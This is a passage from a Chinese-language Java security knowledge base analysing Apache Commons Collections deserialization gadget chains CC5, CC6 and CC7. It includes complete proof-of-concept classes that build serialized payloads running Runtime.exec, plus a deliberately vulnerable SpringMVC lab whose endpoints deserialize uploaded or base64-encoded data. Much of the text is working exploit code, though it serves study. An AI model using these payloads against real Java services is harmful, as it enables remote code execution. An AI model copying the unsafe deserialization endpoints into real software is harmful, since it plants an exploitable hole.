lazyMap = LazyMap.decorate(innerMap,transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"1\"); BadAttributeValueExpException val = new BadAttributeValueExpException(null); Field valfield = val.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(val,entry); try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cc5.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(val); FileInputStream fileInputStream = new FileInputStream(\"cc5.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } } 0x1 第一部分为CC1 LazyMap 利用链前部分，也可以参考CC1 分析，这里只要调用了LazyMap#get，就会触发ChainedTransformer.transform(),进而对transformers链式调用 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,transformerChain); 0x2 在简介中可以看到，TiedMapEntry实例化的entry需要赋值给BadAttributeValueExpException@val,当反序列化的时候，取到对象，则会调用TiedMapEntry#toString方法，进而调用TiedMapEntry#get方法，其中Map可控，就是反序列化得来的恶意的TiedMapEntry实例lazymap TiedMapEntry entry = new TiedMapEntry(lazyMap, \"1\"); BadAttributeValueExpException val = new BadAttributeValueExpException(null); Field valfield = val.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(val,entry); 对应的调用链为 Gadget chain: ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 调试 调试过程和LazyMap是一样的，我们在LazyMap#get处factory.transform(key)处打下断点来分析 可以看到利用链路为BadAttributeValueExpException.readObject()-> TiedMapEntry.toString()-> LazyMap.get()->ChainedTransformer.transform() 这里就是常规链式调用了 [!TIP] 注：在调试过程中，如果在LazyMap#get前的堆栈打上断点，就无法进入LazyMap.get()的if语句 在调试过程中，如果在LazyMap.get()之前的堆栈中打下断点，比如BadAttributeValueExpException.readObject()、TiedMapEntry.toString()、TiedMapEntry.getValue()处打上断点，是无法进入 LazyMap.get()if 判断语句 在这里可以看到，我圈起来的部分，这里的意思就是已经执行了，因为发生调用了，只不过debug无法进入 到这里我们直接看LazyMap.get()方法，这里断点一定要打在if处，不然是不能进入断点，可以看到，在if处，得到了map参数已经不是空，而是在序列化的时候已经赋的初值。可以通过比较没有在LazyMap.get()前的堆栈下断点的区别 图1 LazyMap.get()堆栈前下断点 图2 LazyMap.get()堆栈前无断点，这就是为什么我在调试部分我没有在其他函数处打断点，而是直接在LazyMap#get()处打断点。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2024-09-06 15:50:46 "},"知识库/02.JAVA安全/19.CommonsCollections/06.CC6/Commons Collections 6 分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/06.CC6/Commons Collections 6 分析.html","title":"Commons Collections 6 分析","keywords":"","body":"简介 CC6 也是利用的是CC1 LazyMap#get, 触发ChainedTransformer链式调用，当然和CC5一样，得去寻找对应在哪儿会调用LazyMap#get,这里还是使用TiedMapEntry类，因为该类的构造函数map值可控，可以构造为lazymap，在Commons Collections 5 分析中，可以知道只要调用TiedMapEntry#getvalue 就能执行TiedMapEntry#get 在TiedMapEntry#get方法中，map值即为可控的lazymap 目前在jdk1.7，jdk8u81测试是没有问题 分析链路 /* Gadget chain: java.io.ObjectInputStream.readObject() java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() by @matthias_kaiser */ 环境 jdk1.7 Commons Collection 3.1 看一下TiedMapEntry.java 源码，在hashCode() 方法中调用了getValue()函数，也就是需要找到TiedMapEntry的实例来调用这个hashCode()函数 /** * Constructs a new entry with the given Map and key. * * @param map the map * @param key the key */ public TiedMapEntry(Map map, Object key) { super(); this.map = map; this.key = key; } /** * Gets the value of this entry direct from the map. * * @return the value */ public Object getValue() { return map.get(key); } /** * Gets a hashCode compatible with the equals method. * * Implemented per API documentation of {@link java.util.Map.Entry#hashCode()} * * @return a suitable hash code */ public int hashCode() { Object value = getValue(); return (getKey() == null ? 0 : getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } 那么去看看ysoserial里提供的CC6链路（这里截取一部分），从readObject()之后，主要需要看HashMap#put-> HashMap#hash是如何调用到TiedMapEntry#hashcode，这时就需要关注HashMap类 java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() 我们从后往前分析先看HashMap#hash 这里传递的参数k是一个Obejct，只要k对象不是String类型，那么就会执行hashCode()方法，那么这里就需要想办法让指定参数k为TiedMapEntry的实例 // HashMap.java final int hash(Object k) { int h = hashSeed; if (0 != h && k instanceof String) { return sun.misc.Hashing.stringHash32((String) k); } h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h >>> 20) ^ (h >>> 12); return h ^ (h >>> 7) ^ (h >>> 4); } 继续看HashMap#put, 在下面代码块的20行调用了hash()，此处put(K key, V value)接收的参数key要传入key保证为TiedMapEntry的实例，且table不能为EMPTY_TABLE // HashMap.java /** * Associates the specified value with the specified key in this map. * If the map previously contained a mapping for the key, the old * value is replaced. * * @param key key with which the specified value is to be associated * @param value value to be associated with the specified key * @return the previous value associated with key, or * null if there was no mapping for key. * (A null return can also indicate that the map * previously associated null with key.) */ public V put(K key, V value) { if (table == EMPTY_TABLE) { inflateTable(threshold); } if (key == null) return putForNullKey(value); int hash = hash(key); int i = indexFor(hash, table.length); for (Entry e = table[i]; e != null; e = e.next) { Object k; if (e.hash == hash && ((k = e.key) == key || key.equals(k))) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; addEntry(hash, key, value, i); return null; } 再往上回溯，可以看到在HashSet#readObject，在下面的代码块中，第24行，map.put(e,PRESENT)在put过程中，map为HashMap，e为对应的TiedMapEntry的实例，就能保证整个链路完整执行 // HashSet.java /** * Reconstitute the HashSet instance from a stream (that is, * deserialize it). */ private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in any hidden serialization magic s.defaultReadObject(); // Read in HashMap capacity and load factor and create backing HashMap int capacity = s.readInt(); float loadFactor = s.readFloat(); map = (((HashSet)this) instanceof LinkedHashSet ? new LinkedHashMap(capacity, loadFactor) : new HashMap(capacity, loadFactor)); // Read in size int size = s.readInt(); // Read in all elements in the proper order. for (int i=0; i ysoserial分析 // jdk1.7 && Commons Collections 3.1 // ...LazyMap逻辑 // 此处生成的实例为HashMap HashSet map = new HashSet(1); // 此处调用的HashSet的add方法，然后add方法中map为HashMap再调用put方法，此时Entry[] table 为空，且key不为对应的TiedMapEntry实例，不满足条件 map.add(\"foo\"); //那么需要反射将HashMap$Entry[K,V][] table 赋值，且在调用put的时候key为对应的TiedMapEntry实例 // 首先需要从HashSet实例的map值赋到HashMap实例map上，这里反射第一次将HashSet的实例map赋值给HashMap的实例Map Field f = HashSet.class.getDeclaredField(\"map\"); f.setAccessible(true); HashMap innerMap = (HashMap) f.get(map); // 此时 innerMap已经为HashMap实例，这会儿就需要反射HashMap的实例中的table赋值，让其不为null Field f1 = HashMap.class.getDeclaredField(\"table\"); f1.setAccessible(true); // 取值操作，HashMap实例中table的值赋值给一个对象数组 Object[] array = (Object[]) f1.get(innerMap); // 此时这个数据的长度应该只有1，并且对应的值就应该为foo=java.lang.Object@6b7536e7 Object node = array[0]; // 此时最后一步就需要反射取得这个HashMap$Entry的key，并将其赋值为TiedMapEntry的实例 Field keyFiled = node.getClass().getDeclaredField(\"key\"); keyField.setAccessible(true); keyField.set(node, \"TiedMapEntry的实例\"); // 最后再将map序列化成文件 writeObject(map); POC ysoserial（反序列化的HashSet） package com.myproject; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class TestCC6 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChian = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChian); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"123\"); HashSet map = new HashSet(1); map.add(\"foo\"); Field f = null; try { f = HashSet.class.getDeclaredField(\"map\"); } catch (NoSuchFieldException e) { f = HashSet.class.getDeclaredField(\"backingMap\"); } f.setAccessible(true); HashMap innimpl = (HashMap) f.get(map); Field f2 = null; try { f2 = HashMap.class.getDeclaredField(\"table\"); } catch (NoSuchFieldException e) { f2 = HashMap.class.getDeclaredField(\"elementData\"); } f2.setAccessible(true); Object[] objects = (Object[]) f2.get(innimpl); Object node = objects[0]; if(node == null){ node = objects[1]; } Field keyField = null; try { keyField = node.getClass().getDeclaredField(\"key\"); } catch (Exception e) { keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\"); } keyField.setAccessible(true); keyField.set(node, entry); try { FileOutputStream fileOutputStream = new FileOutputStream(\"cc6.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(map); FileInputStream fileInputStream = new FileInputStream(\"cc6.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } catch (Exception e) { e.printStackTrace(); } } } 更改poc(反序列化HashMap) java.io.ObjectInputStream.readObject() java.util.HashMap.readObject() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.keyvalue.TiedMapEntry.get() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() 根据ysoserial改写，其实思路都一样 package com.myproject; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class TestCC6_Poc_1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChian = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChian); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); // 直接创建一个HashMap HashMap innimpl = new HashMap(); // HashMap 里一定要有初始值，不然table为空无法获取对应的key innimpl.put(null, \"123\"); Field f2 = null; try { f2 = HashMap.class.getDeclaredField(\"table\"); } catch (NoSuchFieldException e) { f2 = HashMap.class.getDeclaredField(\"elementData\"); } f2.setAccessible(true); Object[] objects = (Object[]) f2.get(innimpl); Object node = objects[0]; Field keyField = null; try { keyField = node.getClass().getDeclaredField(\"key\"); } catch (Exception e) { keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\"); } keyField.setAccessible(true); keyField.set(node, entry); try { FileOutputStream fileOutputStream = new FileOutputStream(\"cc6_1.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(innimpl); // FileInputStream fileInputStream = new FileInputStream(\"cc6_1.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } catch (Exception e) { e.printStackTrace(); } } } 更改POC_1(反序列化HashSet 1次反射) 其实看HashSet这个类的时候，我们可以看到调用add方法的时候，其实传入entry之后，对应的Object就是恶意对象实例，那么就会调用lazymap#get方法，从而在客户端就执行1次命令 具体可以看如下代码，当map.add(entry)之后，就会弹出notepad Transformer[] fakertransformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"notepad.exe\"}) }; Transformer transformerChain = new ChainedTransformer(fakertransformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); HashSet map = new HashSet(1); map.add(entry); 调试一下如上的代码，在add处，传入的是e为entry 在调用hash函数的时候，传入的也是entry 最后调用key(entry).hashcode()这时就会调用TiedMapEntry#hashcode，最后就会调用LazyMap#get方法 那么在客户端执行成功之后，是不行的，因为在LazyMap#get处，会判断map 中是否存在对应的key，如果存在，就不会调用factory.transform // lazymap#get public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } 此时就需要保证在反序列化的时候lazymap中map不能有任何key lazyMap.remove(\"foo\"); 此时还未执行remove操作，可以看到lazymap存在值为foo 执行remove之后，可以看到，lazymap清空了 在ysoserial这个项目中，比如CC1中，都是在最后通过替换ChainedTransformer中的iTransformers为恶意的transformers来完成步骤 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain,transformers); 最后就是序列化与反序列化的步骤 try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cc6_2.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(map); FileInputStream fileInputStream = new FileInputStream(\"cc6_2.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } 完整poc package com.myproject; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class TestCC6_Poc_2 { public static void main(String[] args) throws Exception { Transformer[] fakertransformers = new Transformer[]{ new ConstantTransformer(1) }; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(fakertransformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); HashSet map = new HashSet(1); map.add(entry); lazyMap.remove(\"foo\"); Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain,transformers); try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cc6_2.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(map); FileInputStream fileInputStream = new FileInputStream(\"cc6_2.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } } 在最后生成了序列化的文件，再将前面的代码注释掉，只留下反序列化的代码，最后只会执行transformers Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:40:57 "},"知识库/02.JAVA安全/19.CommonsCollections/07.CC7/Commons Collections 7 分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/07.CC7/Commons Collections 7 分析.html","title":"Commons Collections 7 分析","keywords":"","body":"简介 CC7 也是利用的Commons Collections 3.1 的利用，看ysoserial里的利用链为入口是HashTable，针对HashTable的反序列化，再通过AbstractMap#equals来调用LazyMap#get /* Payload method chain: java.util.Hashtable.readObject java.util.Hashtable.reconstitutionPut org.apache.commons.collections.map.AbstractMapDecorator.equals java.util.AbstractMap.equals org.apache.commons.collections.map.LazyMap.get org.apache.commons.collections.functors.ChainedTransformer.transform org.apache.commons.collections.functors.InvokerTransformer.transform java.lang.reflect.Method.invoke sun.reflect.DelegatingMethodAccessorImpl.invoke sun.reflect.NativeMethodAccessorImpl.invoke sun.reflect.NativeMethodAccessorImpl.invoke0 java.lang.Runtime.exec */ 链路分析 Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain); lazyMap1.put(\"yy\",1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\"zZ\", 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 2); hashtable.put(lazyMap2, 1); 0x1 CC7 这里有一个知识点，直接看HashTable#put函数，传入的key和value为我们传入的第二个key-value对，在这个函数里，我们可以看到他会判断是否和传入的第一个值是否重复，也就是代码块中第8行到第17行，如果已经存在，就不会再写入hashtable中，如果不存在则会直接写入 在此处可以看到首先会对传入的key（也就是lazymap）进行执行一次hashcode()计算hash值，然后会对比已经存在hashtable的数据的hash是否与我们传入的key.hashCode()是否相等，然后就会调用已存在的lazymap1与传入的lazymap2进行比较 public synchronized V put(K key, V value) { // Make sure the value is not null if (value == null) { throw new NullPointerException(); } // Makes sure the key is not already in the hashtable. Entry tab[] = table; int hash = key.hashCode(); int index = (hash & 0x7FFFFFFF) % tab.length; @SuppressWarnings(\"unchecked\") Entry entry = (Entry)tab[index]; for(; entry != null ; entry = entry.next) { if ((entry.hash == hash) && entry.key.equals(key)) { V old = entry.value; entry.value = value; return old; } } addEntry(hash, key, value, index); return null; } 这里我再补充一下hashCode函数做了什么操作，在下图可以看见，对Key和Value进行Objects.hashCode()之后又做了一次异或，这时就需要保证Objects.hashCode(key1) == Objects.hashCode(key2)，Objects.hashCode(value1) == Objects.hashCode(value2),这样计算出来的hashCode才是相等的，这里我尝试了很多，都没有发现相等的Key，ysoserial的作者给出的 yy 和 zZ hashCode就是相等的 0x2 然后再看equals 函数，这里可以看到传入的object 为lazymap2，当前的this.map 为第一个传入的lazymap1(因为是他调用的equals方法)，然后再跟进equals // AbstractMapDecorator.java public boolean equals(Object object) { return object == this ? true : this.map.equals(object); } 跟进下面代码块第8-24行，这里m为传入的lazymap2，第13行从迭代器里取出来的是已经写入到HashTable里的Entry，然后遍历获取对应的map（因为只有1个，这里就以lazymap1来说明了），获取lazymap1的key以及value，如果value 不为null，这里在22行就存在value.equals(m.get(key))，在这里我们不需要再关注这个equals函数，而是对m.get(key)关注，m为lazymap2，而调用get方法就是我们最终的目的，虽然现在还是在序列化过程中 // AbstractMap public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map m = (Map) o; if (m.size() != size()) return false; try { Iterator> i = entrySet().iterator(); while (i.hasNext()) { Entry e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null && m.containsKey(key))) return false; } else { if (!value.equals(m.get(key))) return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true; } 在序列化过程中，调用了lazymap的get方法之后，返回了value(Object) ， 此时lazymap就多了这个value 0x3 那么在反序列化时，要保证要调用lazymap#get，那么需要保证两个lazymap被hashcode()之后，一定要相等，且调用的是lazymap2#get,那么lazymap2的Transformer factor 就要为执行命令的transformers，也需要将多余的LazyMap删除掉 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; lazyMap2.remove(\"yy\"); Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain, transformers); POC 完整poc如下 package com.myproject; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class TestCC7 { public static void main(String[] args) throws Exception { Transformer[] fackerTransformer = new Transformer[]{}; Transformer transformerChain = new ChainedTransformer(fackerTransformer); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain); lazyMap1.put(\"yy\",1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\"zZ\", 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 2); hashtable.put(lazyMap2, 1); Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain, transformers); lazyMap2.remove(\"yy\"); try { FileOutputStream fileOutputStream = new FileOutputStream(\"cc7.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(hashtable); FileInputStream fileInputStream = new FileInputStream(\"cc7.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } catch (Exception e) { e.printStackTrace(); } } } 调试 直接在LazyMap#get处打上断点，可以清晰看到对应的反序列化堆栈，就和序列化是一样的，最后把lazymap2里多余的键值对删除，并将其Transformer factor更改为cc1的经典transformers，然后再链式调用即可执行命令 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:41:28 "},"知识库/02.JAVA安全/19.CommonsCollections/08.Commons Collections 系列简单靶场.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/08.Commons Collections 系列简单靶场.html","title":"08.Commons Collections 系列简单靶场","keywords":"","body":"简介 由于在CC链的学习过程中，是使用的IO操作，模拟网络传输操作，在这里难免会不太理解如果是在web传输过程中，如何实现序列化数据在网络上传输，并且在网络传输过程中，序列化数据（二进制流）与源文件的hash值不等，以及文件特征丢失等等很奇怪的问题，目前找到原因就是编码问题，但是二进制流的会被篡改的问题还没有解决，但是在测试反序列化，就能知道有哪些需要注意的事项了 环境 jdk 8u181 maven 3.8.5 springmvc 4.3.18.RELEASE tomcat 8.5.79 搭建SpringMVC web选取SpringMVC，关于SpringMVC的搭建过程，请参考SpringMVC内存马#创建SpringMVC项目，Tomcat版本为8.5.79，目录结构如下所示 然后整体思路是，通过文件上传，上传已经序列化好的文件（可以通过ysoserial项目创建，也可以自己下载对应的Commons Collections包，进行序列化成文件) 为什么会用文件上传的形式？这个在后面提及，当然还有更好的方式，但是只是为了验证网络传输，所以也就选择了最简单的方式 但是文件上传需要用到中间件，依赖如下，添加到pom.xml中 commons-fileupload commons-fileupload 1.3.1 commons-io commons-io 2.4 并且在dispatcher-servlet.xml里添加bean，配置上传文件的最大值，以及默认的编码方式 HelloController /hi接口是返回前端的文件上传页面，/ysoserial接口则是处理传入的序列化的=数据，然后进行反序列化操作 package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.multipart.MultipartFile; import java.io.*; @Controller public class HelloController { @RequestMapping(value = \"/hi\") public String ReturnJsp(){ return \"hello\"; } @RequestMapping(value = \"/ysoserial\") public String SerialTest(@RequestParam(\"file\") MultipartFile f1) throws Exception{ ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(f1.getBytes()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); return \"test\"; } } 启动起来，效果如下： 这里上传对应的已经序列化过后的文件(比如CC7.ser)，即可执行命令 然后将它运行起来之后，就可以看到正常的网络传输过程中，在web中如何反序列化 这个靶场其实很简单，但是在其中的问题很多，所以才会有这一篇文章 在针对上传文件属实有点low了，这里将文件输出成base64编码，然后网络传输传递base64编码，然后再序列化 // Base64EncodeTest package com.myproject; import sun.misc.BASE64Decoder; import sun.misc.BASE64Encoder; import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream; public class Base64EncodeTest { public static String encodeBase64File(String path) throws Exception{ File file = new File(path); FileInputStream fileInputStream = new FileInputStream(file); byte[] buffer = new byte[(int) file.length()]; fileInputStream.read(buffer); fileInputStream.close(); return new BASE64Encoder().encode(buffer); } public static void decodeBase64File(String base64Encode,String targetPath) throws Exception{ byte[] buffer = new BASE64Decoder().decodeBuffer(base64Encode); FileOutputStream outputStream = new FileOutputStream(targetPath); outputStream.write(buffer); outputStream.close(); } public static void main(String[] args) throws Exception { String base64Code = encodeBase64File(\"cc7.ser\"); System.out.println(base64Code); } } 然后我们对base64编码的二进制文件，base64解码还原来比较一下sha256 // Base64EncodeTest //... public static void main(String[] args) throws Exception { String base64Code = encodeBase64File(\"cc7.ser\"); decodeBase64File(base64Code,\"cc7base64Decode.ser\"); } 可以发现是hash之后是相等的，那么最后需要更改的就是web接收的参数，为base64字符串，这个字符串当解码之后就是二进制流，需要存放在一个byte数组中，然后再存放在ByteArrayInputStream中，然后使用ObjectInputStream来读取，最后再readObject进行反序列化 byte[] buff = new BASE64Decoder().decodeBuffer(request.getParameter(\"data\")); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(buff); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); 完整的Spring web Controller 如下，对应的接口为/ysoserialBase64 package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.multipart.MultipartFile; import sun.misc.BASE64Decoder; import java.io.*; import javax.servlet.http.HttpServletRequest; @Controller public class HelloController { @RequestMapping(value = \"/hi\") public String ReturnJsp(){ return \"hello\"; } @RequestMapping(value = \"/ysoserial\") public String SerialTest(@RequestParam(\"file\") MultipartFile f1) throws Exception{ ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(f1.getBytes()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); return \"test\"; } @RequestMapping(value = \"/ysoserialBase64\") public String SerialBase64Test(HttpServletRequest request) throws IOException, ClassNotFoundException { byte[] buff = new BASE64Decoder().decodeBuffer(request.getParameter(\"data\")); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(buff); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); return \"test\"; } } 在进行传输base64编码的时候，一定要注意，因为base64编码存在+,在web进行传输的时候+会被解码成空格则会导致解码失败，详情参考Base64编码/解码原理，在这里需要将base64编码再进行一次URL编码放在burp里传输，如下所示 相关问题 0x1 接收POST Body 最开始想如Adobe ColdFusion AMF Deserialization Remote Command Execution 